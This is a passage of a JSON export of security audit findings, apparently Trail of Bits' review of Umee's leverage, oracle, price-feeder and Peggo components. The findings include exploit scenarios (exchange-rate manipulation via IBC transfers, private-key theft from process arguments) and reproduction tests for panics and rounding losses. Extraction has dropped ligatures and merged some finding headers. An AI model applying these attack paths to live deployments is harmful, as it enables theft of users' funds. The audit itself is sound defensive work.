will not collect borrowing fees. Token/uToken exchange rates are always greater than or equal to 1 and are less than an expected maximum. To avoid rapid signicant price increases and decreases, ensure that the rates do not change more quickly than expected. The exchangeRate value cannot be changed by public (user-callable) methods like LendAsset and WithdrawAsset . Pay special attention to rounding errors and make sure that the module is the beneciary of all rounding operations. 9. It is impossible to liquidate more than the closeFactor in a single liquidation transaction for a defaulted loan; be mindful of the fact that a single transaction can include more than one message. Long term, e xtend the simulation module to cover all operations that may occur in a real Umee deployment, along with all potential error states, and run it many times before each release. Ensure the following:       All modules and operations are included in the simulation module. The simulation uses a small number of accounts (e.g., between 5 and 20) to increase the likelihood of an interesting state change. The simulation uses the currencies/tokens that will be used in the production network. Oracle price changes are properly simulated. (In addition to a mode in which prices are changed randomly, implement a mode in which prices are changed only slightly, a mode in which prices are highly volatile, and a mode in which prices decrease or increase continuously for a long time period.) The simulation continues running when a transaction triggers an error. All transaction code paths are executed. (Enable code coverage to see how often individual lines are executed.)", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "15. Attempts to overdraw collateral cause WithdrawAsset to panic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The WithdrawAsset function panics when an account attempts to withdraw more collateral than the account holds. While panics triggered during transaction runs are recovered by the Cosmos SDK , they should be used only to handle unexpected events that should not occur in normal blockchain operations. The function should instead check the collateralToWithdraw value and return an error if it is too large. The panic occurs in the Dec.Sub method when the calculation it performs results in an overow (gure 15.1). func (k Keeper) WithdrawAsset( /* (...) */ ) error { // (...) if amountFromCollateral.IsPositive() { if k.GetCollateralSetting(ctx, lenderAddr, uToken.Denom) { // (...) // Calculate what borrow limit will be AFTER this withdrawal collateral := k.GetBorrowerCollateral(ctx, lenderAddr) collateralToWithdraw := sdk.NewCoins(sdk.NewCoin(uToken.Denom, amountFromCollateral)) newBorrowLimit, err := k.CalculateBorrowLimit(ctx, collateral.Sub(collateralToWithdraw) ) Figure 15.1: umee/x/leverage/keeper/keeper.go#L124-L159 To reproduce this issue, use the test shown in gure 15.2. Exploit Scenario A user of the Umee system who has enabled the collateral setting lends 1,000 UMEE tokens. The user later tries to withdraw 1,001 UMEE tokens. Due to the lack of validation of the collateralToWithdraw value, the transaction causes a panic. However, the panic is recovered, and the transaction nishes with a panic error . Because the system does not provide a proper error message, the user is confused about why the transaction failed. Recommendations Short term, when a user attempts to withdraw collateral, have the WithdrawAsset function check whether the collateralToWithdraw value is less than or equal to the collateral balance of the users account and return an error if it is not. This will prevent the function from panicking if the withdrawal amount is too large. Long term, integrate the test shown in gure 15.2 into the codebase and extend it with additional assertions to verify other program states. func (s *IntegrationTestSuite) TestWithdrawAsset_InsufficientCollateral() { app, ctx := s.app, s.ctx lenderAddr := sdk.AccAddress([] byte ( \"addr________________\" )) lenderAcc := app.AccountKeeper.NewAccountWithAddress(ctx, lenderAddr) app.AccountKeeper.SetAccount(ctx, lenderAcc) // mint and send coins s.Require().NoError(app.BankKeeper.MintCoins(ctx, minttypes.ModuleName, initCoins)) s.Require().NoError(app.BankKeeper.SendCoinsFromModuleToAccount(ctx, minttypes.ModuleName, lenderAddr, initCoins)) // mint additional coins for just the leverage module; this way it will have available reserve // to meet conditions in the withdrawal logic s.Require().NoError(app.BankKeeper.MintCoins(ctx, types.ModuleName, initCoins)) // set collateral setting for the account uTokenDenom := types.UTokenFromTokenDenom(umeeapp.BondDenom) err := s.app.LeverageKeeper.SetCollateralSetting(ctx, lenderAddr, uTokenDenom, true ) s.Require().NoError(err) // lend asset err = s.app.LeverageKeeper.LendAsset(ctx, lenderAddr, sdk.NewInt64Coin(umeeapp.BondDenom, 1000000000 )) // 1k umee s.Require().NoError(err) // verify collateral amount and total supply of minted uTokens collateral := s.app.LeverageKeeper.GetCollateralAmount(ctx, lenderAddr, uTokenDenom) expected := sdk.NewInt64Coin(uTokenDenom, 1000000000 ) // 1k u/umee s.Require().Equal(collateral, expected) supply := s.app.LeverageKeeper.TotalUTokenSupply(ctx, uTokenDenom) s.Require().Equal(expected, supply) // withdraw more collateral than having - this panics currently uToken := collateral.Add(sdk.NewInt64Coin(uTokenDenom, 1 )) err = s.app.LeverageKeeper.WithdrawAsset(ctx, lenderAddr, uToken) s.Require().EqualError(err, \"TODO/FIXME: set proper error string here after fixing panic error\" ) // TODO/FIXME: add asserts to verify all other program state } Figure 15.2: A test that can be used to reproduce this issue", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "16. Division by zero causes the LiquidateBorrow function to panic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "Two operations in the x/leverage modules LiquidateBorrow method may involve division by zero and lead to a panic. The rst operation is shown in gure 16.1. If both repayValue and maxRepayValue are zero, the GTE (greater-than-or-equal-to) comparison will succeed, and the Quo method will panic. The repayValue variable will be set to zero if liquidatorBalance is set to zero; maxRepayValue will be set to zero if either closeFactor or borrowValue is set to zero. if repayValue.GTE(maxRepayValue) { // repayment *= (maxRepayValue / repayValue) repayment.Amount = repayment.Amount.ToDec().Mul(maxRepayValue) .Quo(repayValue) .TruncateInt() repayValue = maxRepayValue } Figure 16.1: A potential instance of division by zero ( umee/x/leverage/keeper/keeper.go#452456 ) The second operation is shown in gure 16.2. If both reward.Amount and collateral.AmountOf(rewardDenom) are set to zero, the GTE comparison will succeed, and the Quo method will panic. The collateral.AmountOf(rewardDenom) variable can easily be set to zero, as the user may not have any collateral in the denomination indicated by the variable; reward.Amount will be set to zero if liquidatorBalance is set to zero. // reward amount cannot exceed available collateral if reward.Amount.GTE(collateral.AmountOf(rewardDenom)) { // reduce repayment.Amount to the maximum value permitted by the available collateral reward repayment.Amount = repayment.Amount.Mul(collateral.AmountOf(rewardDenom)) .Quo(reward.Amount) // use all collateral of reward denom reward.Amount = collateral.AmountOf(rewardDenom) } Figure 16.2: A potential instance of division by zero ( umee/x/leverage/keeper/keeper.go#474480 ) Exploit Scenario A user tries to liquidate a loan. For reasons that are unclear to the user, the transaction fails with a panic. Because the error message is not specic, the user has diculty debugging the error. Recommendations Short term, replace the GTE comparison with a strict inequality GT (greater-than) comparison. Long term, carefully validate variables in the LiquidateBorrow method to ensure that every variable stays within the expected range during the entire computation . Write negative tests with edge-case values to ensure that the methods handle errors gracefully.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "17. Architecture-dependent code ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "In the Go programming language, the bit size of an int variable depends on the platform on which the code is executed. On a 32-bit platform, it will be 32 bits, and on a 64-bit platform, 64 bits. Validators running on dierent architectures will therefore interpret int types dierently, which may lead to transaction-parsing discrepancies and ultimately to a consensus failure or chain split. One use of the int type is shown in gure 17.1. Because casting the maxValidators variable to the int type should not cause it to exceed the maximum int value for a 32-bit platform, we set the severity of this nding to informational. for ; iterator.Valid() && i < int (maxValidators) ; iterator.Next() { Figure 17.1: An architecture-dependent loop condition in the EndBlocker method ( umee/x/oracle/abci.go#34 ) Exploit Scenario The maxValidators variable (a variable of the uint32 type) is set to its maximum value, 4,294,967,296. During the execution of the x/oracle modules EndBlocker method, some validators cast the variable to a negative number, while others cast it to a large positive integer. The chain then stops working because the validators cannot reach a consensus. Recommendations Short term, ensure that architecture-dependent types are not used in the codebase . Long term, test the system with parameters set to various edge-case values, including the maximum and minimum values of dierent integer types. Test the system on all common architectures (e.g., architectures with 32- and 64-bit CPUs), or develop documentation specifying the architecture(s) used in testing.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "18. Weak cross-origin resource sharing settings ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "In the price-feeder s cross-origin resource sharing (CORS) settings, most of the same-origin policy protections are disabled. This increases the severity of vulnerabilities like cross-site request forgery. v1Router.Methods( \"OPTIONS\" ).HandlerFunc( func (w http.ResponseWriter, r *http.Request) { w.Header().Set( \"Access-Control-Allow-Origin\" , r.Header.Get( \"Origin\" )) w.Header().Set( \"Access-Control-Allow-Methods\" , \"GET, PUT, POST, DELETE, OPTIONS\" ) w.Header().Set( \"Access-Control-Allow-Headers\" , \"Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With\" ) w.Header().Set( \"Access-Control-Allow-Credentials\" , \"true\" ) w.WriteHeader(http.StatusOK) }) Figure 18.1: The current CORS conguration ( umee/price-feeder/router/v1/router.go#4652 ) We set the severity of this nding to informational because no sensitive endpoints are exposed by the price-feeder router. Exploit Scenario A new endpoint is added to the price-feeder API. It accepts PUT requests that can update the tools provider list. An attacker uses phishing to lure the price-feeder s operator to a malicious website. The website triggers an HTTP PUT request to the API, changing the provider list to a list in which all addresses are controlled by the attacker. The attacker then repeats the attack against most of the validators, manipulates on-chain prices, and drains the systems funds. Recommendations Short term, use strong default values in the CORS settings . Long term, ensure that APIs exposed by the price-feeder have proper protections against web vulnerabilities.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "19. price-feeder is at risk of rate limiting by public APIs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "Price providers used by the price-feeder tool may enforce limits on the number of requests served to them. After reaching a limit, the tool should take certain actions to avoid a prolonged or even permanent ban. Moreover, using API keys or non-HTTP access channels would decrease the price-feeder s chance of being rate limited. Every API has its own rules, which should be reviewed and respected. The rules of three APIs are summarized below.    Binance has hard, machine-learning, and web application rewall limits . Users are required to stop sending requests if they receive a 429 HTTP response code . Kraken implements rate limiting based on call counters and recommends using the WebSockets API instead of the REST API. Huopi restricts the number of requests to 10 per second and recommends using an API key. Exploit Scenario A price-feeder exceeds the limits of the Binance API. It is rate limited and receives a 429 HTTP response code from the API. The tool does not notice the response code and continues to spam the API. As a result, it receives a permanent ban. The validator using the price-feeder then starts reporting imprecise exchange rates and gets slashed. Recommendations Short term, review the requirements and recommendations of all APIs supported by the system . Enforce their requirements in a user-friendly manner; for example, allow users to set and rotate API keys, delay HTTP requests so that the price-feeder will avoid rate limiting but still report accurate prices, and log informative error messages upon reaching rate limits. Long term, perform stress-testing to ensure that the implemented safety checks work properly and are robust.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "20. Lack of prioritization of oracle messages ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "Oracle messages are not prioritized over other transactions for inclusion in a block. If the network is highly congested, the messages may not be included in a block. Although the Umee system could increase the fee charged for including an oracle message in a block, that solution is suboptimal and may not work. Tactics for prioritizing important transactions include the following:    Using the custom CheckTx implementation introduced in Tendermint version 0.35 , which returns a priority argument Reimplementing part of the Tendermint engine , as Terra Money did Using Substrates dispatch classes , which allow developers to mark transactions as normal , operational , or mandatory Exploit Scenario The Umee network is congested. Validators send their exchange rate votes, but the exchange rates are not included in a block. An attacker then exploits the situation by draining the network of its tokens. Recommendations Short term, use a custom CheckTx method to prioritize oracle messages . This will help prevent validators votes from being left out of a block and ignored by an oracle. Long term, ensure that operations that aect the whole system cannot be front-run or delayed by attackers or blocked by network congestion.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "21. Risk of token/uToken exchange rate manipulation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The Umee specication states that the token/uToken exchange rate can be aected only by the accrual of interest (not by Lend , Withdraw , Borrow , Repay , or Liquidate transactions). However, this invariant can be broken:   When tokens are burned or minted through an Inter-Blockchain Communication (IBC) transfer, the ibc-go library accesses the x/bank modules keeper interface, which changes the total token supply (as shown in gure 21.2). This behavior is mentioned in a comment shown in gure 22.1. Sending tokens directly to the module through an x/bank message also aects the exchange rate. func (k Keeper) TotalUTokenSupply(ctx sdk.Context, uTokenDenom string ) sdk.Coin { if k.IsAcceptedUToken(ctx, uTokenDenom) { return k.bankKeeper.GetSupply(ctx, uTokenDenom) // TODO - Question: Does bank module still track balances sent (locked) via IBC? // If it doesn't then the balance returned here would decrease when the tokens // are sent off, which is not what we want. In that case, the keeper should keep // an sdk.Int total supply for each uToken type. } return sdk.NewCoin(uTokenDenom, sdk.ZeroInt()) } Figure 21.1: The method vulnerable to unexpected IBC transfers ( umee/x/leverage/keeper/keeper.go#6573 ) if err := k.bankKeeper.BurnCoins( ctx, types.ModuleName, sdk.NewCoins(token), Figure 21.2: The IBC library code that accesses the x/bank modules keeper interface ( ibc-go/modules/apps/transfer/keeper/relay.go#136137 ) Exploit Scenario An attacker with two Umee accounts lends tokens through the system and receives a commensurate number of uTokens. He temporarily sends the uTokens from one of the accounts to another chain (chain B), decreasing the total supply and increasing the token/uToken exchange rate. The attacker uses the second account to withdraw more tokens than he otherwise could and then sends uTokens back from chain B to the rst account. In this way, he drains funds from the module. Recommendations Short term, ensure that the TotalUTokenSupply method accounts for IBC transfers. Use the Cosmos SDKs blocklisting feature to disable direct transfers to the leverage and oracle modules. Consider setting DefaultSendEnabled to false and explicitly enabling certain tokens transfer capabilities. Long term, follow GitHub issues #10386 and #5931 , which concern functionalities that may enable module developers to make token accounting more reliable. Additionally, ensure that the system accounts for ination .", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "22. Collateral dust prevents the designation of defaulted loans as bad debt ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "An accounts debt is considered bad debt only if its collateral balance drops to zero. The debt is then repaid from the modules reserves. However, users may liquidate the majority of an accounts assets but leave a small amount of debt unpaid. In that case, the transaction fees may make liquidation of the remaining collateral unprotable. As a result, the bad debt will not be paid from the module's reserves and will linger in the system indenitely. Exploit Scenario A large loan taken out by a user becomes highly undercollateralized. An attacker liquidates most of the users collateral to repay the loan but leaves a very small amount of the collateral unliquidated. As a result, the loan is not considered bad debt and is not paid from the reserves. The rest of the tokens borrowed by the user remain out of circulation, preventing other users from withdrawing their funds. Recommendations Short term, establish a lower limit on the amount of collateral that must be liquidated in one transaction to prevent accounts from holding dust collateral. Long term, establish a lower limit on the number of tokens to be used in every system operation. That way, even if the systems economic incentives are lacking, the operations will not result in dust tokens.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "23. Users can borrow assets that they are actively using as collateral ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "When a user calls the BorrowAsset function to take out a loan, the function does not check whether the user is borrowing the same type of asset as the collateral he or she supplied. In other words, a user can borrow tokens from the collateral that the user supplied. The Umee system prohibits users from borrowing assets worth more than the collateral they have provided, so a user cannot directly exploit this issue to borrow more funds than the user should be able to borrow. However, a user can borrow the vast majority of his or her collateral to continue accumulating lending rewards while largely avoiding the risks of providing collateral. Exploit Scenario An attacker provides 10 ATOMs to the protocol as collateral and then immediately borrows 9 ATOMs. He continues to earn lending rewards on his collateral but retains the use of most of the collateral. The attacker, through ash loans, could also resupply the borrowed amount as collateral and then immediately take out another loan, repeating the process until the amount he had borrowed asymptotically approached the amount of liquidity he had provided. Recommendations Short term, determine whether borrowers ability to borrow their own collateral is an issue. (Note that Compounds front end disallows such operations, but its actual contracts do not.) If it is, have BorrowAsset check whether a user is attempting to borrow the same asset that he or she staked as collateral and block the operation if so. Alternatively, ensure that borrow fees are greater than prots from lending. Long term, assess whether the liquidity-mining incentives accomplish their intended purpose, and ensure that the lending incentives and borrowing costs work well together.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "24. Providing additional collateral may be detrimental to borrowers in default ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "When a user who is in default on a loan deposits additional collateral, the collateral will be immediately liquidable. This may be surprising to users and may aect their satisfaction with the system. Exploit Scenario A user funds a loan and plans to use the coins he deposited as the collateral on a new loan. However, the user does not realize that he defaulted on a previous loan. As a result, bots instantly liquidate the new collateral he provided. Recommendations Short term, if a user is in default on a loan, consider blocking the user from calling the LendAsset or SetCollateralSetting function with an amount of collateral insucient to collateralize the defaulted position . Alternatively, document the risks associated with calling these functions when a user has defaulted on a loan. Long term, ensure that users cannot incur unexpected nancial damage, or document the nancial risks that users face.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "25. Insecure storage of price-feeder keyring passwords ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "Users can store oracle keyring passwords in the price-feeder conguration le. However, the price-feeder stores these passwords in plaintext and does not provide a warning if the conguration le has overly broad permissions (like those shown in gure 25.1). Additionally, neither the price-feeder README nor the relevant documentation string instructs users to provide keyring passwords via standard input (gure 25.2), which is a safer approach. Moreover, neither source provides information on dierent keyring back ends, and the example price-feeder conguration uses the \"test\" back end . An attacker with access to the conguration le on a users system, or to a backup of the conguration le, could steal the users keyring information and hijack the price-feeder oracle instance. $ ls -la ./price-feeder/price-feeder.example.toml -rwx rwxrwx 1 dc dc 848 Feb 6 10:37 ./price-feeder/price-feeder.example.toml $ grep pass ./price-feeder/price-feeder.example.toml pass = \"exampleKeyringPassword\" $ ~/go/bin/price-feeder ./price-feeder/price-feeder.example.toml 10:42AM INF starting price-feeder oracle... 10:42AM ERR oracle tick failed error=\"key with addressA4F324A31DECC0172A83E57A3625AF4B89A91F1Fnot found: key not found\" module=oracle 10:42AM INF starting price-feeder server... listen_addr=0.0.0.0:7171 Figure 25.1: The price-feeder does not warn the user if the conguration le used to store the keyring password in plaintext has overly broad permissions. // CreateClientContext creates an SDK client Context instance used for transaction // generation, signing and broadcasting. func (oc OracleClient) CreateClientContext() (client.Context, error ) { var keyringInput io.Reader if len (oc.KeyringPass) > 0 { keyringInput = newPassReader(oc.KeyringPass) } else { keyringInput = os.Stdin } Figure 25.2: The price-feeder supports the use of standard input to provide keyring passwords. ( umee/price-feeder/oracle/client/client.go#L184-L192 ) Exploit Scenario A user sets up a price-feeder oracle and stores the keyring password in the price-feeder conguration le, which has been miscongured with overly broad permissions. An attacker gains access to another user account on the user's machine and is able to read the price-feeder oracle's keyring password. The attacker uses that password to access the keyring data and can then control the user's oracle account. Recommendations Short term, take the following steps:     Recommend that users provide keyring passwords via standard input. Check the permissions of the conguration le. If the permissions are too broad, provide an error warning the user of the issue, as openssh does when it nds that a private key le has overly broad permissions. Document the risks associated with storing a keyring password in the conguration le. Improve the price-feeder s keyring-related documentation. Include a link to the Cosmos SDK keyring documentation so that users can learn about dierent keyring back ends and the addition of keyring entries, among other concepts. 26. Insu\u0000cient validation of genesis parameters Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-UMEE-26 Target: Genesis parameters", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "27. Potential overows in Peggo's current block calculations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "In a few code paths, Peggo calculates the number of a delayed block by subtracting a delay value from the latest block number. This subtraction will result in an overow and cause Peggo to operate incorrectly if it is run against a blockchain node whose latest block number is less than the delay value. We set the severity of this nding to informational because the issue is unlikely to occur in practice; moreover, it is easy to have Peggo wait to perform the calculation until the latest block number is one that will not cause an overow. An overow may occur in the following methods:  gravityOrchestrator.GetLastCheckedBlock (gure 27.1)  gravityOrchestrator.CheckForEvents  gravityOrchestrator.EthOracleMainLoop  gravityRelayer.FindLatestValset // add delay to ensure minimum confirmations are received and block is finalized currentBlock := latestHeader.Number.Uint64() - ethBlockConfirmationDelay Figure 27.1: peggo/orchestrator/oracle_resync.go#L35-L42 Recommendations Short term, have Peggo wait to calculate the current block number until the blockchain for which Peggo was congured reaches a block number that will not cause an overow.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "28. Peggo does not validate Ethereum address formats ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "In several code paths in the Peggo codebase, the go-ethereum HexToAddress function (gure 28.1) is used to parse Ethereum addresses. This function does not return an error when the format of the address passed to it is incorrect. The HexToAddress function is used in tests as well as in the following parts of the codebase:  peggo/cmd/peggo/bridge.go#L143 (in the peggo deploy-gravity command, to parse addresses fetched from gravityQueryClient )  peggo/cmd/peggo/bridge.go#L403 (in parsing of the peggo send-to-cosmos command's token-address argument)  peggo/cmd/peggo/orchestrator.go#L150 (in the peggo orchestrator [gravity-addr] command)  peggo/cmd/peggo/bridge.go#L536 and twice in #L545-L555  peggo/cmd/peggo/keys.go#L199 , #L274 , and #L299  peggo/orchestrator/ethereum/gravity/message_signatures.go#L36 , #L40 , #L102 , and #L117  p eggo/orchestrator/ethereum/gravity/submit_batch.go#L53 , #L72 , #L94 , #L136 , and #L144  peggo/orchestrator/ethereum/gravity/valset_update.go#L37 , #L55 , and #L87  peggo/orchestrator/main_loops.go#L307  peggo/orchestrator/relayer/batch_relaying.go#L81-L82 , #L237 , and #L250 We set the severity of this nding to undetermined because time constraints prevented us from verifying the impact of the issue. However, without additional validation of the addresses fetched from external sources, Peggo may operate on an incorrect Ethereum address. // HexToAddress returns Address with byte values of s. // If s is larger than len(h), s will be cropped from the left. func HexToAddress( s string ) Address { return BytesToAddress( FromHex(s) ) } // FromHex returns the bytes represented by the hexadecimal string s. // s may be prefixed with \"0x\". func FromHex(s string ) [] byte { if has0xPrefix(s) { s = s[ 2 :] } if len (s)% 2 == 1 { s = \"0\" + s } return Hex2Bytes(s) } // Hex2Bytes returns the bytes represented by the hexadecimal string str. func Hex2Bytes(str string ) [] byte { h, _ := hex.DecodeString(str) return h } Figure 28.1: The HexToAddress function, which calls the BytesToAddress , FromHex , and Hex2Bytes functions, ignores any errors that occur during hex-decoding. Recommendations Short term, review the code paths that use the HexToAddress function, and use a function like ValidateEthAddress to validate Ethereum address string formats before calls to HexToAddress . Long term, add tests to ensure that all code paths that use the HexToAddress function properly validate Ethereum address strings before parsing them.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "29. Peggo takes an Ethereum private key as a command-line argument ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "Certain Peggo commands take an Ethereum private key ( --eth-pk ) as a command-line argument. If an attacker gained access to a user account on a system running Peggo, the attacker would also gain access to any Ethereum private key passed through the command line. The attacker could then use the key to steal funds from the Ethereum account. $ peggo orchestrator {gravityAddress} \\ --eth-pk= $ETH_PK \\ --eth-rpc= $ETH_RPC \\ --relay-batches= true \\ --relay-valsets= true \\ --cosmos-chain-id=... \\ --cosmos-grpc= \"tcp://...\" \\ --tendermint-rpc= \"http://...\" \\ --cosmos-keyring=... \\ --cosmos-keyring-dir=... \\ --cosmos-from=... Figure 29.1: An example of a Peggo command line In Linux, all users can inspect other users commands and their arguments. A user can enable the proc lesystem's hidepid=2 gid=0 mount options to hide metadata about spawned processes from users who are not members of the specied group. However, in many Linux distributions, those options are not enabled by default. Exploit Scenario An attacker gains access to an unprivileged user account on a system running the Peggo orchestrator. The attacker then uses a tool such as pspy to inspect processes run on the system. When a user or script launches the Peggo orchestrator, the attacker steals the Ethereum private key passed to the orchestrator. Recommendations Short term, avoid using a command-line argument to pass an Ethereum private key to the Peggo program. Instead, fetch the private key from the keyring.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "30. Peggo allows the use of non-local unencrypted URL schemes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The peggo orchestrator command takes --tendermint-rpc and --cosmos-grpc ags specifying Tendermint and Cosmos remote procedure call (RPC) URLs. If an unencrypted non-local URL scheme (such as http://<some-external-ip>/) is passed to one of those ags, Peggo will not reject it or issue a warning to the user. As a result, an attacker connected to the same local network as the system running Peggo could launch a man-in-the-middle attack, intercepting and modifying the network trac of the device. $ peggo orchestrator {gravityAddress} \\ --eth-pk= $ETH_PK \\ --eth-rpc= $ETH_RPC \\ --relay-batches= true \\ --relay-valsets= true \\ --cosmos-chain-id=... \\ --cosmos-grpc= \"tcp://...\" \\ --tendermint-rpc= \"http://...\" \\ --cosmos-keyring=... \\ --cosmos-keyring-dir=... \\ --cosmos-from=... Figure 30.1: The problematic ags Exploit Scenario A user sets up Peggo with an external Tendermint RPC address and an unencrypted URL scheme (http://). An attacker on the same network performs a man-in-the-middle attack, modifying the values sent to the Peggo orchestrator to his advantage. Recommendations Short term, warn users that they risk a man-in-the-middle attack if they set the RPC endpoint addresses to external hosts that use unencrypted schemes such as http://.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "31. Lack of prioritization of Peggo orchestrator messages ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "Peggo orchestrator messages, like oracle messages ( TOB-UMEE-20 ), are not prioritized over other transactions for inclusion in a block. As a result, if the network is highly congested, orchestrator transactions may not be included in the earliest possible block. Although the Umee system could increase the fee charged for including a Peggo orchestrator message in a block, that solution is suboptimal and may not work. Tactics for prioritizing important transactions include the following:    Using the custom CheckTx implementation introduced in Tendermint version 0.35 , which returns a priority argument Reimplementing part of the Tendermint engine , as Terra Money did Using Substrates dispatch classes , which allow developers to mark transactions as normal , operational , or mandatory Exploit Scenario A user sends tokens from Ethereum to Umee by calling Gravity Bridges sendToCosmos function. When validators notice the transaction in the Ethereum logs, they send MsgSendToCosmosClaim messages to Umee. However, 34% of the messages are front-run by an attacker, eectively stopping Umee from acknowledging the token transfer. Recommendations Short term, use a custom CheckTx method to prioritize Peggo orchestrator messages. Long term, ensure that operations that aect the whole system cannot be front-run or delayed by attackers or blocked by network congestion. 32. Failure of a single broadcast Ethereum transaction causes a batch-wide failure Severity: Undetermined Diculty: High Type: Conguration Finding ID: TOB-UMEE-32 Target: Peggo orchestrator", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Medium"]}, {"title": "33. Peggo orchestrators IsBatchProtable function uses only one price oracle ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The Peggo orchestrator relays batches of Ethereum transactions only when doing so will be protable (gure 33.1). To determine an operations protability, it uses the price of ETH in USD, which is fetched from a single sourcethe CoinGecko API. This creates a single point of failure, as a hacker with control of the API could eectively choose which batches Peggo would relay by manipulating the price. The IsBatchProfitable function (gure 33.2) fetches the ETH/USD price; the gravityRelayer.priceFeeder eld it uses is set earlier in the getOrchestratorCmd function (gure 33.3). func (s *gravityRelayer) RelayBatches( /* (...) */ ) error { // (...) for tokenContract, batches := range possibleBatches { // (...) // Now we iterate through batches per token type. for _, batch := range batches { // (...) // If the batch is not profitable, move on to the next one. if !s.IsBatchProfitable(ctx, batch.Batch, estimatedGasCost, gasPrice, s.profitMultiplier) { continue } // (...) Figure 33.1: peggo/orchestrator/relayer/batch_relaying.go#L173-L176 func (s *gravityRelayer) IsBatchProfitable( / * (...) */ ) bool { // (...) // First we get the cost of the transaction in USD usdEthPrice, err := s.priceFeeder.QueryETHUSDPrice() Figure 33.2: peggo/orchestrator/relayer/batch_relaying.go#L211-L223 func getOrchestratorCmd() *cobra.Command { cmd := &cobra.Command{ Use: \"orchestrator [gravity-addr]\" , Args: cobra.ExactArgs( 1 ), Short: \"Starts the orchestrator\" , RunE: func (cmd *cobra.Command, args [] string ) error { // (...) coingeckoAPI := konfig.String(flagCoinGeckoAPI) coingeckoFeed := coingecko.NewCoingeckoPriceFeed( /* (...) */ ) // (...) relayer := relayer.NewGravityRelayer( /* (...) */ , relayer.SetPriceFeeder(coingeckoFeed), ) Figure 33.3: peggo/cmd/peggo/orchestrator.go#L162-L188 Exploit Scenario All Peggo orchestrator instances depend on the CoinGecko API. An attacker hacks the CoinGecko API and falsies the ETH/USD prices provided to the Peggo relayers, causing them to relay unprotable batches. Recommendations Short term, address the Peggo orchestrators reliance on a single ETH/USD price feed. Consider using the price-feeder tool to fetch pricing information or reading prices from the Umee blockchain. Long term, implement protections against extreme ETH/USD price changes; if the ETH/USD price changes by too large a margin, have the system stop fetching prices and require an operator to investigate whether the issue was caused by malicious behavior. Additionally, implement tests to check the orchestrators handling of random and extreme changes in the prices reported by the price feed. References  Check Coingecko prices separately from BatchRequesterLoop (GitHub issue)", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "34. Rounding errors may cause the module to incur losses ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf", "body": "The amount that a user has borrowed is calculated using AdjustedBorrow data and an InterestScalar value. Because the system uses xed-precision decimal numbers that are truncated to integer values, there may be small rounding errors in the computation of those amounts. If an error occurs, it will benet the user, whose repayment will be slightly lower than the amount the user borrowed. Figure 34.1 shows a test case demonstrating this vulnerability. It should be added to the umee/x/leverage/keeper/keeper_test.go le. Appendix G discusses general rounding recommendations. // Test rounding error bug - users can repay less than have borrowed // It should pass func (s *IntegrationTestSuite) TestTruncationBug() { lenderAddr, _ := s.initBorrowScenario() app, ctx := s.app, s.ctx // set some interesting interest scalar _ = s.app.LeverageKeeper.SetInterestScalar(s.ctx, umeeapp.BondDenom, sdk.MustNewDecFromStr( \"2.9\" )) // save initial balances initialSupply := s.app.BankKeeper.GetSupply(s.ctx, umeeapp.BondDenom) s.Require().Equal(initialSupply.Amount.Int64(), int64 ( 10000000000 )) initialModuleBalance := s.app.LeverageKeeper.ModuleBalance(s.ctx, umeeapp.BondDenom) // lender borrows 20 umee err := s.app.LeverageKeeper.BorrowAsset(ctx, lenderAddr, sdk.NewInt64Coin(umeeapp.BondDenom, 20000000 )) s.Require().NoError(err) // lender repays in a few transactions iters := int64 ( 99 ) payOneIter := int64 ( 2000 ) amountDelta := int64 ( 99 ) // borrowed expects to \"earn\" this amount for i := int64 ( 0 ); i < iters; i++ { repaid, err := s.app.LeverageKeeper.RepayAsset(ctx, lenderAddr, sdk.NewInt64Coin(umeeapp.BondDenom, payOneIter)) s.Require().NoError(err) s.Require().Equal(sdk.NewInt(payOneIter), repaid) } // lender repays 